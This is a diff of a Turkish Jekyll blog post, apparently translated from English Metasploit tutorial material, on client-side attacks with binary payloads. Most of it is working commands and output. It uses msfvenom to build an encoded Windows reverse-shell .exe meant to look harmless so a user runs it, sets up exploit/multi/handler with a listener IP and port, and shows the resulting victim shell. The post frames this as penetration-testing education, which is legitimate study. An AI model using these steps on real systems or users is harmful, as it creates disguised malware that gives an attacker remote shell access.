@@ -5,7 +5,7 @@ date: 2017-05-20 08:00:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -16,22 +16,28 @@ tags:
 - Metasploit Framework binary payloads
 - msf binary payloads
 
-excerpt: Nessus, kişisel ve ticari olmayan kullanım için ücretsiz olarak edinilebilen bir zafiyet tarama programıdır. Tenable firması tarafından geliştirilmekte olan Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz.
+excerpt: Pentest işlemi gerçekleştirenler, sistemde bulunan kullanıcının, bir şekilde linke tıklamasını veya zararlı yazılım çalıştırmasını sağladığında kendilerine hedef sistemde kapı açmış olurlar. Bu sebeple, istemci taraflı saldırılar, kullanıcıyla etkileşim gerektirmektedir. Bu tür saldırılar, sosyal mühendislik çalışmalarını da gerektirir.
 ---
 
-client site attacks
-Client side attacks are always a fun topic and a major front for attackers today. As network administrators and software developers fortify the perimeter, pentesters need to find a way to make the victims open the door for them to get into the network. Client side attacks require user-interaction such as enticing them to click a link, open a document, or somehow get to your malicious website.
+# İstemci Taraflı Saldırılar
 
-There are many different ways of using Metasploit to perform client-side attacks and we will demonstrate a few of them here.
+İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar, kullanıcılarınızın zafiyetlerini kullanırlar. 
 
-binary payloads
+Pentest işlemi gerçekleştirenler, sistemde bulunan kullanıcının, bir şekilde linke tıklamasını veya zararlı yazılım çalıştırmasını sağladığında kendilerine hedef sistemde kapı açmış olurlar. Bu sebeple, istemci taraflı saldırılar, kullanıcıyla etkileşim gerektirmektedir. Bu tür saldırılar, sosyal mühendislik çalışmalarını da gerektirir.
 
-It seems like Metasploit is full of interesting and useful features. One of these is the ability to generate an executable from a Metasploit payload. This can be very useful in situations such as social engineering; if you can get a user to run your payload for you, there is no reason to go through the trouble of exploiting any software.
+Metasploit Framework, bu tür zararlı kodların oluşturması için bir çok modül sağlamaktadır.
 
-Let’s look at a quick example of how to do this. We will generate a reverse shell payload, execute it on a remote system, and get our shell. To do this, we will use the command line tool msfvenom. This command can be used for generating payloads to be used in many locations and offers a variety of output options, from perl to C to raw. We are interested in the executable output, which is provided by the ‘-f exe‘ option.
+# binary payloads
 
-We’ll generate a Windows reverse shell executable that will connect back to us on port 31337.
+binary payloads olarak adlandırılan çalıştırılabilir dosyalar, zararsız .exe dosyaları gibi görünse de aslında içinde tehlikeli kodlar bulunduran dosyalardır. Dosyayı alacak kullanıcıya, önemli bir dosya hissi uyandırarak tıklaması sağlanır ve zararlı kod çalışır. 
 
+Bu yazıda, Metasploit Framework tarafından sağlanan ```msfvenom``` komut satırı aracı kullanılacaktır. ```msfvenom``` kullanarak ```.exe```, ```perl``` veya ```c``` program çıktıları elde edebilirsiniz. Burada ```.exe``` formatı kullanılacaktır. 
+
+## Windows Reverse Shell Açan Payload Oluşturma
+
+Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adresine bağlanması için bir payload oluşturmak için ```windows/shell/reverse_tcp``` modülünü kullanacağız. Öncelikle bu modülün çalışmak için hangi değişkenlere ihtiyaç duyduğuna bakalım.
+
+```sh
 root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
 Options for payload/windows/shell/reverse_tcp:
 
@@ -59,7 +65,10 @@ LPORT     4444             yes       The listen port
 
 Description:
   Spawn a piped command shell (staged). Connect back to the attacker
+```
+Bu modül, çıktıda görüldüğü gibi ```LHOST``` ve ```LPORT``` değişkenlerinin ayarlanmasına ihtiyaç duymaktadır. Hedef platform olarak x86 mimari ve Windows işletim sistemi seçilmiştir. Oluşturacağımız payload için bir encoder kullanmamız gerekiyor. Bunun için de ```x86/shikata_ga_nai``` encoder modülünü kullanacağız. Bu şartlar altında aşağıdaki komut, encoder kullanarak ```/tmp``` klasörünün içinde ```1.exe``` isimli bir dosya oluşturacaktır.
 
+```sh
 root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
@@ -67,12 +76,21 @@ x86/shikata_ga_nai succeeded with size 326 (iteration=0)
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 Saved as: /tmp/1.exe
+```
+```1.exe``` dosyamızın türünü kontrol edelim. ```file``` komutuyla yaptığımız kontrolde ```1.exe``` doyasının MS Windows dosyası olduğu aşağıda görülmektedir.
 
+```sh
 root@kali:~# file /tmp/1.exe
 /tmp/1.exe: PE32 executable (GUI) Intel 80386, for MS Windows
-Now we see we have a Windows executable ready to go. Now, we will use multi/handler, which is a stub that handles exploits launched outside of the framework.
+```
 
-root@kali:~# msfconsole -q
+## Dinleme Ayarları
+
+Elimizde istemcinin tıklayıp çalıştıracağı ```1.exe``` dosyası artık hazır durumda. Şimdi, tıklama işlemi gerçekleştiğinde dinleyecek bir modülü çalıştırmamız gerekiyor. Bunun için ```exploit/multi/handler``` modülünü ve içinde ```payload windows/shell/reverse_tcp``` dinleyici payload u kullanacağız.
+
+Öncelikle ```exploit/multi/handler``` modülünü yükleyip seçeneklere bakalım.
+
+```sh
 msf > use exploit/multi/handler
 msf exploit(handler) > show options
 
@@ -87,8 +105,11 @@ Exploit target:
    Id  Name            
    --  ----            
    0   Wildcard Target
-When using the exploit/multi/handler module, we still need to tell it which payload to expect so we configure it to have the same settings as the executable we generated.
+``` 
 
+Gördüğünüz gibi exploit modülünde herhangi bir zorunlu değişken bulunmuyor. Şimdi payload ayarlaması yapalım.
+
+```sh
 msf exploit(handler) > set payload windows/shell/reverse_tcp
 payload => windows/shell/reverse_tcp
 msf exploit(handler) > show options
@@ -113,15 +134,27 @@ Exploit target:
    Id  Name
    --  ----
    0   Wildcard Target 
+```
 
+Bu çıktıda görülmektedir ki Payload için ```LHOST``` ve ```LPORT``` değerlerinin girilmesi gerekmekte.
 
+```LHOST```: Local Host yani yerelde dinleyecek IP adresini, 
+
+```LPORT```: Local Port, yani dinleyecek Port numarasını ifade eder. 
+
+Bu değerlerin, ```msfvenom``` komutuyla oluşturduğumuz ```1.exe``` dosyası için girdiğimiz değerler ile aynı olmasına dikkat edin. ```1.exe``` dosyası içinde hangi değerler gömülü ise zararlı yazılım bu bilgilere göre haberleşme sağlamak isteyecektir.
+
+```sh
 msf exploit(handler) > set LHOST 172.16.104.130
 LHOST => 172.16.104.130
 msf exploit(handler) > set LPORT 31337
 LPORT => 31337
 msf exploit(handler) >
-Now that we have everything set up and ready to go, we run exploit for the multi/handler and execute our generated executable on the victim. The multi/handler handles the exploit for us and presents us our shell.
+```
 
+Tüm ayarlamaları yaptıktan sonra ```exploit``` komutuyla modül çalıştırılır ve dinlemeye başlanır. Aşağıda, dinleme sonucunda gerçekleşen bir istemci tıklaması sonucu açılan komut satırı görülmektedir.
+
+```sh
 msf exploit(handler) > exploit
 
 [*] Handler binding to LHOST 0.0.0.0
@@ -134,3 +167,5 @@ Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\Documents and Settings\Victim\My Documents>
+```
+
